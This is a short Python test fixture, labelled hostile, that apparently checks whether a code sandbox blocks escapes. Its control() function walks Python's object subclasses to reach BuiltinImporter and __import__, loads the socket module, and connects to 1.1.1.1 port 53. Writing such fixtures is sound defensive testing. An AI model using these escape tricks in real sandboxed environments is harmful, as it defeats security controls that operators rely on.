# ruff: noqa  (intentionally hostile test fixture)
"""Hostile: reach the import machinery through the object graph and load socket anyway."""


def control(obs, state):
    for cls in ().__class__.__bases__[0].__subclasses__():
        if cls.__name__ == "BuiltinImporter":
            sock_mod = cls.load_module("_socket")
            s = sock_mod.socket()
            s.connect(("1.1.1.1", 53))
            return 1.0, state
    for cls in ().__class__.__bases__[0].__subclasses__():
        if cls.__name__ == "_wrap_close":
            imp = cls.__init__.__globals__["__builtins__"]["__import__"]
            sock_mod = imp("socket")
            sock_mod.create_connection(("1.1.1.1", 53), timeout=1.0)
            return 1.0, state
    return 0.5, state
